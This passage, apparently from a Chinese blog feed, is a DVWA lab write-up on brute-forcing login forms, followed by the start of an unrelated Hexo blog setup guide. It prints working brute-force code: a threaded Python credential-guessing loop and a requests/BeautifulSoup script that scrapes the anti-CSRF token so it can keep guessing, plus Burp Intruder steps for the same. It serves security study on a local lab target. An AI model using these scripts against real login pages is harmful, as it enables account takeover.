class="built_in">print</span>(<span class="string">&quot;\033[31;1musername:%s,password:%s----right account!\033[0m&quot;</span> % (username, password))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;username:%s,password:%s----wrong account!&quot;</span> % (username, password))</span><br><span class="line"></span><br><span class="line">    semaphore.release()</span><br><span class="line"></span><br><span class="line">semaphore = threading.BoundedSemaphore(<span class="number">50</span>)  <span class="comment"># 生成信号量实例，最多允许50个线程同时运行</span></span><br><span class="line"></span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;username.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line1 <span class="keyword">in</span> f1:</span><br><span class="line">    username = line1.strip()</span><br><span class="line">    f2 = <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> line2 <span class="keyword">in</span> f2:</span><br><span class="line">        password=line2.strip()</span><br><span class="line">        t = threading.Thread(target=connect, args=(username,password,),)</span><br><span class="line">        t.start()</span><br><span class="line">    f2.close()</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure><h1 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h1><p>难度设置成high级别</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119124301444.png" alt="image-20220119124301444"></p><h2 id="分析源码-2"><a href="#分析源码-2" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); <span class="comment">//使用checktoken防止csrf攻击，验证表单中的Token是否与用户Session（或Cookies）中的Token一致</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input </span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ]; </span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> ); <span class="comment">//用stripslashes（）删除反斜杠</span></span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>)); <span class="comment">//用mysqli_real_escape_string（）对sql语句过滤</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input </span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ]; </span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> ); </span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>)); </span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123; </span><br><span class="line">        <span class="comment">// Get users details </span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> ); </span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Login failed </span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) ); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>High 级别的代码使用了 <strong>Anti-CSRF token</strong> 来抵御 <strong>CSRF</strong> 的攻击，使用了 <strong>stripslashes</strong> 函数和 <strong>mysqli_real_esacpe_string</strong> 来<strong>抵御 SQL 注入和 XSS</strong> 的攻击。<br>由于使用了 <strong>Anti-CSRF token</strong>，每次服务器返回的登陆页面中都会包含一个随机的 <strong>user_token</strong> 的值，用户每次登录时都要将 <strong>user_token</strong> 一起提交。服务器收到请求后，会优先做 <strong>token</strong> 的检查，就算用户名密码正确，一样会登录失败。所以我们在暴力破解的时候就需要加上这个 <strong>token</strong> 这个选项一次性爆破三个字段<br>这样我们才会有机会把真正的密码破解出来。</p><h2 id="漏洞测试-1"><a href="#漏洞测试-1" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>还是先测试能否登陆、然后抓包。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119124630262.png" alt="image-20220119124630262"></p><p><strong>发给 Intruder 模块进行处理</strong></p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119124920018.png" alt="image-20220119124920018"></p><p><strong>填写 payload 进行爆破</strong></p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119124932158.png" alt="image-20220119124932158"></p><p>点击start attack后等待爆破结果</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119125157221.png" alt="image-20220119125157221"></p><p>爆破失败，状态码全是 302，长度都一致，说明之前单纯的思路已经不能解决问题了。仔细观察，可以发现多了一个字段，就是 user_token。</p><p>user_token 主要有两个作用：</p><pre><code>1、防止表单重复提交2、用来作身份验证，每次的请求中的 user_token 都不一样，会发生变化。强行解释一波就是因为有 uesr_token 的限制，故每次爆破就不只是那用户名和密码进行枚举就行了，一旦你的身份没有通过验证，就算给你正确的密码一样也会登录失败。</code></pre><p><strong>返回 Intruder 模块，选择新的攻击模式</strong></p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119125412767.png" alt="image-20220119125412767"></p><p>攻击模式换成 pitchfork，并且将 user_token 的值加上 $ 标签</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119131107923.png" alt="image-20220119131107923"></p><p>Payload1可以不动，将 payload2的模式修改成 “Recursive grep” 即可</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119131124887.png" alt="image-20220119131124887"></p><p>在 Options 里，找到 Grep-Extract，添加 user_token</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119134911241.png" alt="image-20220119134911241"></p><p>将token值复制下来</p><p>我这里是将e2e780f0cad9e3d15d184c27dc624176复制下来</p><p>将其粘贴到这里</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119135048093.png" alt="image-20220119135048093"></p><p>记得把线程改成1，否则会报错</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119135142245.png" alt="image-20220119135142245"></p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119140914933.png" alt="image-20220119140914933"></p><p>现在状态就都是200了，一切正常，等他慢慢跑完就行了，只不过有些慢</p><p>找长度特殊的，得到用户名和密码，然后手工登录验证即可。</p><h2 id="补充：python脚本-1"><a href="#补充：python脚本-1" class="headerlink" title="补充：python脚本"></a>补充：python脚本</h2><p>除了使用Burpsuit，也可以使用python脚本构造数据包头部来爆破，给出一个脚本如下（脚本来源<a href="https://blog.csdn.net/qq_36119192/article/details/82938424">DVWA之Brute Force(暴力破解)</a>）： </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">header=&#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.71.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>:<span class="string">&#x27;http://192.168.71.1/DVWA/vulnerabilities/brute/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;cookie&#x27;</span>:<span class="string">&#x27;security=high; PHPSESSID=ors4oc2dv7hculoj5gasaghcp9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">requrl=<span class="string">&quot;http://192.168.71.1/DVWA/vulnerabilities/brute/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>(<span class="params">requrl,header</span>):</span></span><br><span class="line">    response=requests.get(url=requrl,headers=header)</span><br><span class="line">    <span class="built_in">print</span> (response.status_code,<span class="built_in">len</span>(response.content))</span><br><span class="line">    soup=BeautifulSoup(response.text,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="built_in">input</span>=soup.form.select(<span class="string">&quot;input[type=&#x27;hidden&#x27;]&quot;</span>)   <span class="comment">#返回的是一个list列表</span></span><br><span class="line">    user_token=<span class="built_in">input</span>[<span class="number">0</span>][<span class="string">&#x27;value&#x27;</span>]                   <span class="comment">#获取用户的token</span></span><br><span class="line">    <span class="keyword">return</span> user_token</span><br><span class="line"> </span><br><span class="line">user_token=get_token(requrl,header)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\24107\\Desktop\\password.txt&quot;</span>):</span><br><span class="line">    requrl=<span class="string">&quot;http://192.168.71.1/DVWA/vulnerabilities/brute/?username=admin&amp;password=&quot;</span>+line.strip()+<span class="string">&quot;&amp;Login=Login&amp;user_token=&quot;</span>+user_token</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span> (i , <span class="string">&#x27;admin&#x27;</span> ,line.strip(),end=<span class="string">&quot;  &quot;</span>)</span><br><span class="line">    user_token=get_token(requrl,header)</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>脚本中的字段是针对我个人电脑上的谷歌浏览器，在自己使用前，先burpsuit抓取一个登陆包，然后按照数据包中的头部数据和顺序替换脚本中的header，还有爆破对象的链接、密码字典存放路径也要记得修改。<br>结果如下：</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119144825426.png" alt="image-20220119144825426"></p><h1 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h1><p>切换为impossible级别</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119144944546.png" alt="image-20220119144944546"></p><h2 id="分析源码-3"><a href="#分析源码-3" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    <span class="variable">$total_failed_login</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="variable">$lockout_time</span>       = <span class="number">15</span>;</span><br><span class="line">    <span class="variable">$account_locked</span>     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information)</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="variable">$total_failed_login</span> ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line">        <span class="variable">$last_login</span> = strtotime( <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ] );</span><br><span class="line">        <span class="variable">$timeout</span>    = <span class="variable">$last_login</span> + (<span class="variable">$lockout_time</span> * <span class="number">60</span>);</span><br><span class="line">        <span class="variable">$timenow</span>    = time();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$timenow</span> &lt; <span class="variable">$timeout</span> ) &#123;</span><br><span class="line">            <span class="variable">$account_locked</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// print &quot;The account is locked&lt;br /&gt;&quot;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR);</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$account_locked</span> == <span class="literal">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$avatar</span>       = <span class="variable">$row</span>[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line">        <span class="variable">$failed_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ];</span><br><span class="line">        <span class="variable">$last_login</span>   = <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$failed_login</span> &gt;= <span class="variable">$total_failed_login</span> ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源码使用<strong>Anti-CSRF token防止CSRF攻击</strong>，同时采用<strong>PDO（PHP Data Object）</strong>机制<strong>防御sql注入。</strong><br>  在数据库中针对每一个用户名添加了<strong>failed_login, last_login</strong>字段，<strong>记录用户错误登录次数和上一次登录时间</strong>，<strong>当错误次数大于3次时，锁定账户15分钟。</strong>当正确的用户登录时，提示该用户可能被爆破攻击，并显示错误次数和上次登录时间。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20220119145009236.png" alt="image-20220119145009236"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> dvwa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> dvwa </tag>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从0到1部署Hexo博客</title>
      <link href="/2021/12/29/Hexo/%E4%BB%8E0%E5%88%B01%E9%83%A8%E7%BD%B2Hexo%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/12/29/Hexo/%E4%BB%8E0%E5%88%B01%E9%83%A8%E7%BD%B2Hexo%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="从0到1部署Hexo博客"><a href="#从0到1部署Hexo博客" class="headerlink" title="从0到1部署Hexo博客"></a>从0到1部署Hexo博客</h1><h2 id="什么是-Hexo？"><a href="#什么是-Hexo？" class="headerlink" title="什么是 Hexo？"></a>什么是 Hexo？</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装 Hexo 只需几分钟时间，若您在安装过程中遇到问题或无法找到解决方式，请提交问题，我们会尽力解决您的问题。</p><h3 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h3><p>安装 Hexo 相当简单，只需要先安装下列应用程序即可：</p><pre><code>Node.js (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)Git</code></pre><p>如果您的电脑中已经安装上述必备程序，那么恭喜您！你可以直接前往 安装 Hexo 步骤（<a href="https://hexo.io/zh-cn/docs/#%E5%AE%89%E8%A3%85-Hexo%EF%BC%89%E3%80%82">https://hexo.io/zh-cn/docs/#%E5%AE%89%E8%A3%85-Hexo）。</a></p><p>如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。</p><h3 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h3><pre><code>Windows：下载并安装 git.Mac：使用 Homebrew, MacPorts 或者下载 安装程序。Linux (Ubuntu, Debian)：sudo apt-get install git-coreLinux (Fedora, Red Hat, CentOS)：sudo yum install git-core</code></pre><p><strong>Mac 用户</strong></p><p>如果在编译时可能会遇到问题，请先到 App Store 安装 Xcode，Xcode 完成后，启动并进入 Preferences -&gt; Download -&gt; Command Line Tools -&gt; Install 安装命令行工具。</p><p><strong>Windows 用户</strong></p><p>对于中国大陆地区用户，可以前往 淘宝 Git for Windows 镜像 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://npm.taobao.org/mirrors/git-for-windows/</span><br></pre></td></tr></table></figure><p>下载 git 安装包。</p><h3 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h3><p>Node.js 为大多数平台提供了官方的 （<a href="https://nodejs.org/en/download/%EF%BC%89%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F%E3%80%82%E5%AF%B9%E4%BA%8E%E4%B8%AD%E5%9B%BD%E5%A4%A7%E9%99%86%E5%9C%B0%E5%8C%BA%E7%94%A8%E6%88%B7%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%89%8D%E5%BE%80">https://nodejs.org/en/download/）安装程序。对于中国大陆地区用户，可以前往</a> 淘宝 Node.js 镜像（<a 